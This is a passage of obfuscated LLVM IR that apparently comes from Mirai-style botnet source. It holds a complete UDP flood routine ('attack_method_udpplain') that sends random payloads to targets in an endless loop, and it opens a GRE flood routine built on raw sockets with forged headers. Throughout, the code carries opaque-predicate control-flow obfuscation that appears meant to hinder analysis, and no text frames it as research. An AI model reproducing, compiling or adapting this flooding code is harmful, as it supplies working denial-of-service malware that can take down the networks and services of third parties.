  %468 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %467, i32 0, i32 0
  store i16 %466, i16* %468, align 2
  br label %originalBB55
}

; Function Attrs: noinline nounwind uwtable
define void @attack_method_udpplain(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i8**, align 8
  %11 = alloca i32*, align 8
  %12 = alloca i16, align 2
  %13 = alloca i16, align 2
  %14 = alloca i16, align 2
  %15 = alloca i8, align 1
  %16 = alloca %struct.sockaddr_in, align 4
  %17 = alloca %struct.iphdr*, align 8
  %18 = alloca %struct.udphdr*, align 8
  %19 = alloca i8*, align 8
  %20 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %21 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %22 = alloca i8*, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %23 = load i8, i8* %5, align 1
  %24 = zext i8 %23 to i64
  %25 = call noalias i8* @calloc(i64 %24, i64 8) #7
  %26 = bitcast i8* %25 to i8**
  store i8** %26, i8*** %10, align 8
  %27 = load i8, i8* %5, align 1
  %28 = zext i8 %27 to i64
  %29 = call noalias i8* @calloc(i64 %28, i64 4) #7
  %30 = bitcast i8* %29 to i32*
  store i32* %30, i32** %11, align 8
  %31 = load i8, i8* %7, align 1
  %32 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %33 = call i32 @attack_get_opt_int(i8 zeroext %31, %struct.attack_option* %32, i8 zeroext 7, i32 65535)
  %34 = trunc i32 %33 to i16
  store i16 %34, i16* %12, align 2
  %35 = load i8, i8* %7, align 1
  %36 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %37 = call i32 @attack_get_opt_int(i8 zeroext %35, %struct.attack_option* %36, i8 zeroext 6, i32 65535)
  %38 = trunc i32 %37 to i16
  store i16 %38, i16* %13, align 2
  %39 = load i8, i8* %7, align 1
  %40 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %41 = call i32 @attack_get_opt_int(i8 zeroext %39, %struct.attack_option* %40, i8 zeroext 0, i32 512)
  %42 = trunc i32 %41 to i16
  store i16 %42, i16* %14, align 2
  %43 = load i8, i8* %7, align 1
  %44 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %45 = call i32 @attack_get_opt_int(i8 zeroext %43, %struct.attack_option* %44, i8 zeroext 1, i32 1)
  %46 = trunc i32 %45 to i8
  store i8 %46, i8* %15, align 1
  %47 = bitcast %struct.sockaddr_in* %16 to i8*
  call void @llvm.memset.p0i8.i64(i8* %47, i8 0, i64 16, i32 4, i1 false)
  %48 = load i16, i16* %13, align 2
  %49 = zext i16 %48 to i32
  %50 = icmp eq i32 %49, 65535
  br i1 %50, label %51, label %70

; <label>:51:                                     ; preds = %4
  %52 = load i32, i32* @x.35
  %53 = load i32, i32* @y.36
  %54 = sub i32 %52, 1
  %55 = mul i32 %52, %54
  %56 = urem i32 %55, 2
  %57 = icmp eq i32 %56, 0
  %58 = icmp slt i32 %53, 10
  %59 = or i1 %57, %58
  br i1 %59, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %51
  %60 = call i32 @rand_next()
  %61 = trunc i32 %60 to i16
  store i16 %61, i16* %13, align 2
  %62 = load i32, i32* @x.35
  %63 = load i32, i32* @y.36
  %64 = sub i32 %62, 1
  %65 = mul i32 %62, %64
  %66 = urem i32 %65, 2
  %67 = icmp eq i32 %66, 0
  %68 = icmp slt i32 %63, 10
  %69 = or i1 %67, %68
  br i1 %69, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %89

; <label>:70:                                     ; preds = %4
  %71 = load i32, i32* @x.35
  %72 = load i32, i32* @y.36
  %73 = sub i32 %71, 1
  %74 = mul i32 %71, %73
  %75 = urem i32 %74, 2
  %76 = icmp eq i32 %75, 0
  %77 = icmp slt i32 %72, 10
  %78 = or i1 %76, %77
  br i1 %78, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %70
  %79 = load i16, i16* %13, align 2
  %80 = call zeroext i16 @htons(i16 zeroext %79) #8
  store i16 %80, i16* %13, align 2
  %81 = load i32, i32* @x.35
  %82 = load i32, i32* @y.36
  %83 = sub i32 %81, 1
  %84 = mul i32 %81, %83
  %85 = urem i32 %84, 2
  %86 = icmp eq i32 %85, 0
  %87 = icmp slt i32 %82, 10
  %88 = or i1 %86, %87
  br i1 %88, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %89

; <label>:89:                                     ; preds = %originalBBpart24, %originalBBpart2
  %90 = load i32, i32* @x.35
  %91 = load i32, i32* @y.36
  %92 = sub i32 %90, 1
  %93 = mul i32 %90, %92
  %94 = urem i32 %93, 2
  %95 = icmp eq i32 %94, 0
  %96 = icmp slt i32 %91, 10
  %97 = or i1 %95, %96
  br i1 %97, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %89
  store i32 0, i32* %9, align 4
  %98 = load i32, i32* @x.35
  %99 = load i32, i32* @y.36
  %100 = sub i32 %98, 1
  %101 = mul i32 %98, %100
  %102 = urem i32 %101, 2
  %103 = icmp eq i32 %102, 0
  %104 = icmp slt i32 %99, 10
  %105 = or i1 %103, %104
  br i1 %105, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %106

; <label>:106:                                    ; preds = %282, %originalBBpart28
  %107 = load i32, i32* %9, align 4
  %108 = load i8, i8* %5, align 1
  %109 = zext i8 %108 to i32
  %110 = icmp slt i32 %107, %109
  br i1 %110, label %111, label %285

; <label>:111:                                    ; preds = %106
  %112 = load i32, i32* @x.35
  %113 = load i32, i32* @y.36
  %114 = sub i32 %112, 1
  %115 = mul i32 %112, %114
  %116 = urem i32 %115, 2
  %117 = icmp eq i32 %116, 0
  %118 = icmp slt i32 %113, 10
  %119 = or i1 %117, %118
  br i1 %119, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %111
  %120 = call noalias i8* @calloc(i64 65535, i64 1) #7
  %121 = load i8**, i8*** %10, align 8
  %122 = load i32, i32* %9, align 4
  %123 = sext i32 %122 to i64
  %124 = getelementptr inbounds i8*, i8** %121, i64 %123
  store i8* %120, i8** %124, align 8
  %125 = load i16, i16* %12, align 2
  %126 = zext i16 %125 to i32
  %127 = icmp eq i32 %126, 65535
  %128 = load i32, i32* @x.35
  %129 = load i32, i32* @y.36
  %130 = sub i32 %128, 1
  %131 = mul i32 %128, %130
  %132 = urem i32 %131, 2
  %133 = icmp eq i32 %132, 0
  %134 = icmp slt i32 %129, 10
  %135 = or i1 %133, %134
  br i1 %135, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br i1 %127, label %136, label %161

; <label>:136:                                    ; preds = %originalBBpart212
  %137 = load i32, i32* @x.35
  %138 = load i32, i32* @y.36
  %139 = sub i32 %137, 1
  %140 = mul i32 %137, %139
  %141 = urem i32 %140, 2
  %142 = icmp eq i32 %141, 0
  %143 = icmp slt i32 %138, 10
  %144 = or i1 %142, %143
  br i1 %144, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %136
  %145 = call i32 @rand_next()
  %146 = trunc i32 %145 to i16
  %147 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %148 = load i32, i32* %9, align 4
  %149 = sext i32 %148 to i64
  %150 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %147, i64 %149
  %151 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %150, i32 0, i32 0
  %152 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %151, i32 0, i32 1
  store i16 %146, i16* %152, align 2
  %153 = load i32, i32* @x.35
  %154 = load i32, i32* @y.36
  %155 = sub i32 %153, 1
  %156 = mul i32 %153, %155
  %157 = urem i32 %156, 2
  %158 = icmp eq i32 %157, 0
  %159 = icmp slt i32 %154, 10
  %160 = or i1 %158, %159
  br i1 %160, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br label %170

; <label>:161:                                    ; preds = %originalBBpart212
  %162 = load i16, i16* %12, align 2
  %163 = call zeroext i16 @htons(i16 zeroext %162) #8
  %164 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %165 = load i32, i32* %9, align 4
  %166 = sext i32 %165 to i64
  %167 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %164, i64 %166
  %168 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %167, i32 0, i32 0
  %169 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %168, i32 0, i32 1
  store i16 %163, i16* %169, align 2
  br label %170

; <label>:170:                                    ; preds = %161, %originalBBpart216
  %171 = load i32, i32* @x.35
  %172 = load i32, i32* @y.36
  %173 = sub i32 %171, 1
  %174 = mul i32 %171, %173
  %175 = urem i32 %174, 2
  %176 = icmp eq i32 %175, 0
  %177 = icmp slt i32 %172, 10
  %178 = or i1 %176, %177
  br i1 %178, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %170
  %179 = call i32 @socket(i32 2, i32 2, i32 17) #7
  %180 = load i32*, i32** %11, align 8
  %181 = load i32, i32* %9, align 4
  %182 = sext i32 %181 to i64
  %183 = getelementptr inbounds i32, i32* %180, i64 %182
  store i32 %179, i32* %183, align 4
  %184 = icmp eq i32 %179, -1
  %185 = load i32, i32* @x.35
  %186 = load i32, i32* @y.36
  %187 = sub i32 %185, 1
  %188 = mul i32 %185, %187
  %189 = urem i32 %188, 2
  %190 = icmp eq i32 %189, 0
  %191 = icmp slt i32 %186, 10
  %192 = or i1 %190, %191
  br i1 %192, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  br i1 %184, label %193, label %210

; <label>:193:                                    ; preds = %originalBBpart220
  %194 = load i32, i32* @x.35
  %195 = load i32, i32* @y.36
  %196 = sub i32 %194, 1
  %197 = mul i32 %194, %196
  %198 = urem i32 %197, 2
  %199 = icmp eq i32 %198, 0
  %200 = icmp slt i32 %195, 10
  %201 = or i1 %199, %200
  br i1 %201, label %originalBB22, label %originalBB22alteredBB

originalBB22:                                     ; preds = %originalBB22alteredBB, %193
  %202 = load i32, i32* @x.35
  %203 = load i32, i32* @y.36
  %204 = sub i32 %202, 1
  %205 = mul i32 %202, %204
  %206 = urem i32 %205, 2
  %207 = icmp eq i32 %206, 0
  %208 = icmp slt i32 %203, 10
  %209 = or i1 %207, %208
  br i1 %209, label %originalBBpart224, label %originalBB22alteredBB

originalBBpart224:                                ; preds = %originalBB22
  ret void

; <label>:210:                                    ; preds = %originalBBpart220
  %211 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 0
  store i16 2, i16* %211, align 4
  %212 = load i16, i16* %13, align 2
  %213 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %212, i16* %213, align 2
  %214 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %215 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %214, i32 0, i32 0
  store i32 0, i32* %215, align 4
  %216 = load i32*, i32** %11, align 8
  %217 = load i32, i32* %9, align 4
  %218 = sext i32 %217 to i64
  %219 = getelementptr inbounds i32, i32* %216, i64 %218
  %220 = load i32, i32* %219, align 4
  %221 = bitcast %union.__CONST_SOCKADDR_ARG* %20 to %struct.sockaddr**
  %222 = bitcast %struct.sockaddr_in* %16 to %struct.sockaddr*
  store %struct.sockaddr* %222, %struct.sockaddr** %221, align 8
  %223 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %20, i32 0, i32 0
  %224 = load %struct.sockaddr*, %struct.sockaddr** %223, align 8
  %225 = call i32 @bind(i32 %220, %struct.sockaddr* %224, i32 16) #7
  %226 = icmp eq i32 %225, -1
  br i1 %226, label %227, label %228

; <label>:227:                                    ; preds = %210
  br label %228

; <label>:228:                                    ; preds = %227, %210
  %229 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %230 = load i32, i32* %9, align 4
  %231 = sext i32 %230 to i64
  %232 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %229, i64 %231
  %233 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %232, i32 0, i32 2
  %234 = load i8, i8* %233, align 4
  %235 = zext i8 %234 to i32
  %236 = icmp slt i32 %235, 32
  br i1 %236, label %237, label %263

; <label>:237:                                    ; preds = %228
  %238 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %239 = load i32, i32* %9, align 4
  %240 = sext i32 %239 to i64
  %241 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %238, i64 %240
  %242 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %241, i32 0, i32 1
  %243 = load i32, i32* %242, align 4
  %244 = call i32 @ntohl(i32 %243) #8
  %245 = call i32 @rand_next()
  %246 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %247 = load i32, i32* %9, align 4
  %248 = sext i32 %247 to i64
  %249 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %246, i64 %248
  %250 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %249, i32 0, i32 2
  %251 = load i8, i8* %250, align 4
  %252 = zext i8 %251 to i32
  %253 = lshr i32 %245, %252
  %254 = add i32 %244, %253
  %255 = call i32 @htonl(i32 %254) #8
  %256 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %257 = load i32, i32* %9, align 4
  %258 = sext i32 %257 to i64
  %259 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %256, i64 %258
  %260 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %259, i32 0, i32 0
  %261 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %260, i32 0, i32 2
  %262 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %261, i32 0, i32 0
  store i32 %255, i32* %262, align 4
  br label %263

; <label>:263:                                    ; preds = %237, %228
  %264 = load i32*, i32** %11, align 8
  %265 = load i32, i32* %9, align 4
  %266 = sext i32 %265 to i64
  %267 = getelementptr inbounds i32, i32* %264, i64 %266
  %268 = load i32, i32* %267, align 4
  %269 = bitcast %union.__CONST_SOCKADDR_ARG* %21 to %struct.sockaddr**
  %270 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %271 = load i32, i32* %9, align 4
  %272 = sext i32 %271 to i64
  %273 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %270, i64 %272
  %274 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %273, i32 0, i32 0
  %275 = bitcast %struct.sockaddr_in* %274 to %struct.sockaddr*
  store %struct.sockaddr* %275, %struct.sockaddr** %269, align 8
  %276 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %21, i32 0, i32 0
  %277 = load %struct.sockaddr*, %struct.sockaddr** %276, align 8
  %278 = call i32 @connect(i32 %268, %struct.sockaddr* %277, i32 16)
  %279 = icmp eq i32 %278, -1
  br i1 %279, label %280, label %281

; <label>:280:                                    ; preds = %263
  br label %281

; <label>:281:                                    ; preds = %280, %263
  br label %282

; <label>:282:                                    ; preds = %281
  %283 = load i32, i32* %9, align 4
  %284 = add nsw i32 %283, 1
  store i32 %284, i32* %9, align 4
  br label %106

; <label>:285:                                    ; preds = %106
  br label %286

; <label>:286:                                    ; preds = %365, %285
  store i32 0, i32* %9, align 4
  br label %287

; <label>:287:                                    ; preds = %originalBBpart246, %286
  %288 = load i32, i32* @x.35
  %289 = load i32, i32* @y.36
  %290 = sub i32 %288, 1
  %291 = mul i32 %288, %290
  %292 = urem i32 %291, 2
  %293 = icmp eq i32 %292, 0
  %294 = icmp slt i32 %289, 10
  %295 = or i1 %293, %294
  br i1 %295, label %originalBB26, label %originalBB26alteredBB

originalBB26:                                     ; preds = %originalBB26alteredBB, %287
  %296 = load i32, i32* %9, align 4
  %297 = load i8, i8* %5, align 1
  %298 = zext i8 %297 to i32
  %299 = icmp slt i32 %296, %298
  %300 = load i32, i32* @x.35
  %301 = load i32, i32* @y.36
  %302 = sub i32 %300, 1
  %303 = mul i32 %300, %302
  %304 = urem i32 %303, 2
  %305 = icmp eq i32 %304, 0
  %306 = icmp slt i32 %301, 10
  %307 = or i1 %305, %306
  br i1 %307, label %originalBBpart228, label %originalBB26alteredBB

originalBBpart228:                                ; preds = %originalBB26
  br i1 %299, label %308, label %365

; <label>:308:                                    ; preds = %originalBBpart228
  %309 = load i8**, i8*** %10, align 8
  %310 = load i32, i32* %9, align 4
  %311 = sext i32 %310 to i64
  %312 = getelementptr inbounds i8*, i8** %309, i64 %311
  %313 = load i8*, i8** %312, align 8
  store i8* %313, i8** %22, align 8
  %314 = load i8, i8* %15, align 1
  %315 = icmp ne i8 %314, 0
  br i1 %315, label %316, label %336

; <label>:316:                                    ; preds = %308
  %317 = load i32, i32* @x.35
  %318 = load i32, i32* @y.36
  %319 = sub i32 %317, 1
  %320 = mul i32 %317, %319
  %321 = urem i32 %320, 2
  %322 = icmp eq i32 %321, 0
  %323 = icmp slt i32 %318, 10
  %324 = or i1 %322, %323
  br i1 %324, label %originalBB30, label %originalBB30alteredBB

originalBB30:                                     ; preds = %originalBB30alteredBB, %316
  %325 = load i8*, i8** %22, align 8
  %326 = load i16, i16* %14, align 2
  %327 = zext i16 %326 to i32
  call void @rand_str(i8* %325, i32 %327)
  %328 = load i32, i32* @x.35
  %329 = load i32, i32* @y.36
  %330 = sub i32 %328, 1
  %331 = mul i32 %328, %330
  %332 = urem i32 %331, 2
  %333 = icmp eq i32 %332, 0
  %334 = icmp slt i32 %329, 10
  %335 = or i1 %333, %334
  br i1 %335, label %originalBBpart232, label %originalBB30alteredBB

originalBBpart232:                                ; preds = %originalBB30
  br label %336

; <label>:336:                                    ; preds = %originalBBpart232, %308
  %337 = load i32*, i32** %11, align 8
  %338 = load i32, i32* %9, align 4
  %339 = sext i32 %338 to i64
  %340 = getelementptr inbounds i32, i32* %337, i64 %339
  %341 = load i32, i32* %340, align 4
  %342 = load i8*, i8** %22, align 8
  %343 = load i16, i16* %14, align 2
  %344 = zext i16 %343 to i64
  %345 = call i64 @send(i32 %341, i8* %342, i64 %344, i32 16384)
  br label %346

; <label>:346:                                    ; preds = %336
  %347 = load i32, i32* @x.35
  %348 = load i32, i32* @y.36
  %349 = sub i32 %347, 1
  %350 = mul i32 %347, %349
  %351 = urem i32 %350, 2
  %352 = icmp eq i32 %351, 0
  %353 = icmp slt i32 %348, 10
  %354 = or i1 %352, %353
  br i1 %354, label %originalBB34, label %originalBB34alteredBB

originalBB34:                                     ; preds = %originalBB34alteredBB, %346
  %355 = load i32, i32* %9, align 4
  %356 = add nsw i32 %355, 1
  store i32 %356, i32* %9, align 4
  %357 = load i32, i32* @x.35
  %358 = load i32, i32* @y.36
  %359 = sub i32 %357, 1
  %360 = mul i32 %357, %359
  %361 = urem i32 %360, 2
  %362 = icmp eq i32 %361, 0
  %363 = icmp slt i32 %358, 10
  %364 = or i1 %362, %363
  br i1 %364, label %originalBBpart246, label %originalBB34alteredBB

originalBBpart246:                                ; preds = %originalBB34
  br label %287

; <label>:365:                                    ; preds = %originalBBpart228
  br label %286

originalBBalteredBB:                              ; preds = %originalBB, %51
  %366 = call i32 @rand_next()
  %367 = trunc i32 %366 to i16
  store i16 %367, i16* %13, align 2
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %70
  %368 = load i16, i16* %13, align 2
  %369 = call zeroext i16 @htons(i16 zeroext %368) #8
  store i16 %369, i16* %13, align 2
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %89
  store i32 0, i32* %9, align 4
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %111
  %370 = call noalias i8* @calloc(i64 65535, i64 1) #7
  %371 = load i8**, i8*** %10, align 8
  %372 = load i32, i32* %9, align 4
  %373 = sext i32 %372 to i64
  %374 = getelementptr inbounds i8*, i8** %371, i64 %373
  store i8* %370, i8** %374, align 8
  %375 = load i16, i16* %12, align 2
  %376 = zext i16 %375 to i32
  %377 = icmp eq i32 %376, 65535
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %136
  %378 = call i32 @rand_next()
  %379 = trunc i32 %378 to i16
  %380 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %381 = load i32, i32* %9, align 4
  %382 = sext i32 %381 to i64
  %383 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %380, i64 %382
  %384 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %383, i32 0, i32 0
  %385 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %384, i32 0, i32 1
  store i16 %379, i16* %385, align 2
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %170
  %386 = call i32 @socket(i32 2, i32 2, i32 17) #7
  %387 = load i32*, i32** %11, align 8
  %388 = load i32, i32* %9, align 4
  %389 = sext i32 %388 to i64
  %390 = getelementptr inbounds i32, i32* %387, i64 %389
  store i32 %386, i32* %390, align 4
  %391 = icmp eq i32 %386, -1
  br label %originalBB18

originalBB22alteredBB:                            ; preds = %originalBB22, %193
  br label %originalBB22

originalBB26alteredBB:                            ; preds = %originalBB26, %287
  %392 = load i32, i32* %9, align 4
  %393 = load i8, i8* %5, align 1
  %394 = zext i8 %393 to i32
  %395 = icmp slt i32 %392, %394
  br label %originalBB26

originalBB30alteredBB:                            ; preds = %originalBB30, %316
  %396 = load i8*, i8** %22, align 8
  %397 = load i16, i16* %14, align 2
  %398 = zext i16 %397 to i32
  call void @rand_str(i8* %396, i32 %398)
  br label %originalBB30

originalBB34alteredBB:                            ; preds = %originalBB34, %346
  %399 = load i32, i32* %9, align 4
  %_ = sub i32 0, %399
  %gen = add i32 %_, 1
  %_35 = sub i32 %399, 1
  %gen36 = mul i32 %_35, 1
  %_37 = sub i32 0, %399
  %gen38 = add i32 %_37, 1
  %_39 = sub i32 0, %399
  %gen40 = add i32 %_39, 1
  %_41 = shl i32 %399, 1
  %_42 = sub i32 0, %399
  %gen43 = add i32 %_42, 1
  %_44 = shl i32 %399, 1
  %400 = add nsw i32 %399, 1
  store i32 %400, i32* %9, align 4
  br label %originalBB34
}

; Function Attrs: noinline nounwind uwtable
define void @attack_gre_ip(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
  %12 = alloca i8, align 1
  %13 = alloca i16, align 2
  %14 = alloca i8, align 1
  %15 = alloca i8, align 1
  %16 = alloca i16, align 2
  %17 = alloca i16, align 2
  %18 = alloca i32, align 4
  %19 = alloca i8, align 1
  %20 = alloca i8, align 1
  %21 = alloca i32, align 4
  %22 = alloca %struct.iphdr*, align 8
  %23 = alloca %struct.grehdr*, align 8
  %24 = alloca %struct.iphdr*, align 8
  %25 = alloca %struct.udphdr*, align 8
  %26 = alloca i8*, align 8
  %27 = alloca %struct.iphdr*, align 8
  %28 = alloca %struct.grehdr*, align 8
  %29 = alloca %struct.iphdr*, align 8
  %30 = alloca %struct.udphdr*, align 8
  %31 = alloca i8*, align 8
  %32 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %33 = load i8, i8* %5, align 1
  %34 = zext i8 %33 to i64
  %35 = call noalias i8* @calloc(i64 %34, i64 8) #7
  %36 = bitcast i8* %35 to i8**
  store i8** %36, i8*** %11, align 8
  %37 = load i8, i8* %7, align 1
  %38 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %39 = call i32 @attack_get_opt_int(i8 zeroext %37, %struct.attack_option* %38, i8 zeroext 2, i32 0)
  %40 = trunc i32 %39 to i8
  store i8 %40, i8* %12, align 1
  %41 = load i8, i8* %7, align 1
  %42 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %43 = call i32 @attack_get_opt_int(i8 zeroext %41, %struct.attack_option* %42, i8 zeroext 3, i32 65535)
  %44 = trunc i32 %43 to i16
  store i16 %44, i16* %13, align 2
  %45 = load i8, i8* %7, align 1
  %46 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %47 = call i32 @attack_get_opt_int(i8 zeroext %45, %struct.attack_option* %46, i8 zeroext 4, i32 64)
  %48 = trunc i32 %47 to i8
  store i8 %48, i8* %14, align 1
  %49 = load i8, i8* %7, align 1
  %50 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %51 = call i32 @attack_get_opt_int(i8 zeroext %49, %struct.attack_option* %50, i8 zeroext 5, i32 1)
  %52 = trunc i32 %51 to i8
  store i8 %52, i8* %15, align 1
  %53 = load i8, i8* %7, align 1
  %54 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %55 = call i32 @attack_get_opt_int(i8 zeroext %53, %struct.attack_option* %54, i8 zeroext 6, i32 65535)
  %56 = trunc i32 %55 to i16
  store i16 %56, i16* %16, align 2
  %57 = load i8, i8* %7, align 1
  %58 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %59 = call i32 @attack_get_opt_int(i8 zeroext %57, %struct.attack_option* %58, i8 zeroext 7, i32 65535)
  %60 = trunc i32 %59 to i16
  store i16 %60, i16* %17, align 2
  %61 = load i8, i8* %7, align 1
  %62 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %63 = call i32 @attack_get_opt_int(i8 zeroext %61, %struct.attack_option* %62, i8 zeroext 0, i32 512)
  store i32 %63, i32* %18, align 4
  %64 = load i8, i8* %7, align 1
  %65 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %66 = call i32 @attack_get_opt_int(i8 zeroext %64, %struct.attack_option* %65, i8 zeroext 1, i32 1)
  %67 = trunc i32 %66 to i8
  store i8 %67, i8* %19, align 1
  %68 = load i8, i8* %7, align 1
  %69 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %70 = call i32 @attack_get_opt_int(i8 zeroext %68, %struct.attack_option* %69, i8 zeroext 19, i32 0)
  %71 = trunc i32 %70 to i8
  store i8 %71, i8* %20, align 1
  %72 = load i8, i8* %7, align 1
  %73 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %74 = load i32, i32* @LOCAL_ADDR, align 4
  %75 = call i32 @attack_get_opt_int(i8 zeroext %72, %struct.attack_option* %73, i8 zeroext 25, i32 %74)
  store i32 %75, i32* %21, align 4
  %76 = call i32 @socket(i32 2, i32 3, i32 6) #7
  store i32 %76, i32* %10, align 4
  %77 = icmp eq i32 %76, -1
  br i1 %77, label %78, label %79

; <label>:78:                                     ; preds = %4
  br label %577

; <label>:79:                                     ; preds = %4
  store i32 1, i32* %9, align 4
  %80 = load i32, i32* %10, align 4
  %81 = bitcast i32* %9 to i8*
  %82 = call i32 @setsockopt(i32 %80, i32 0, i32 3, i8* %81, i32 4) #7
  %83 = icmp eq i32 %82, -1
  br i1 %83, label %84, label %87

; <label>:84:                                     ; preds = %79
  %85 = load i32, i32* %10, align 4
  %86 = call i32 @close(i32 %85)
  br label %577

; <label>:87:                                     ; preds = %79
  store i32 0, i32* %9, align 4
  br label %88

; <label>:88:                                     ; preds = %302, %87
  %89 = load i32, i32* @x.37
  %90 = load i32, i32* @y.38
  %91 = sub i32 %89, 1
  %92 = mul i32 %89, %91
  %93 = urem i32 %92, 2
  %94 = icmp eq i32 %93, 0
  %95 = icmp slt i32 %90, 10
  %96 = or i1 %94, %95
  br i1 %96, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %88
  %97 = load i32, i32* %9, align 4
  %98 = load i8, i8* %5, align 1
  %99 = zext i8 %98 to i32
  %100 = icmp slt i32 %97, %99
  %101 = load i32, i32* @x.37
  %102 = load i32, i32* @y.38
  %103 = sub i32 %101, 1
  %104 = mul i32 %101, %103
  %105 = urem i32 %104, 2
  %106 = icmp eq i32 %105, 0
  %107 = icmp slt i32 %102, 10
  %108 = or i1 %106, %107
  br i1 %108, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %100, label %109, label %305

; <label>:109:                                    ; preds = %originalBBpart2
  %110 = call noalias i8* @calloc(i64 1510, i64 8) #7
  %111 = load i8**, i8*** %11, align 8
  %112 = load i32, i32* %9, align 4
  %113 = sext i32 %112 to i64
  %114 = getelementptr inbounds i8*, i8** %111, i64 %113
  store i8* %110, i8** %114, align 8
  %115 = load i8**, i8*** %11, align 8
  %116 = load i32, i32* %9, align 4
  %117 = sext i32 %116 to i64
  %118 = getelementptr inbounds i8*, i8** %115, i64 %117
  %119 = load i8*, i8** %118, align 8
  %120 = bitcast i8* %119 to %struct.iphdr*
  store %struct.iphdr* %120, %struct.iphdr** %22, align 8
  %121 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %122 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %121, i64 1
  %123 = bitcast %struct.iphdr* %122 to %struct.grehdr*
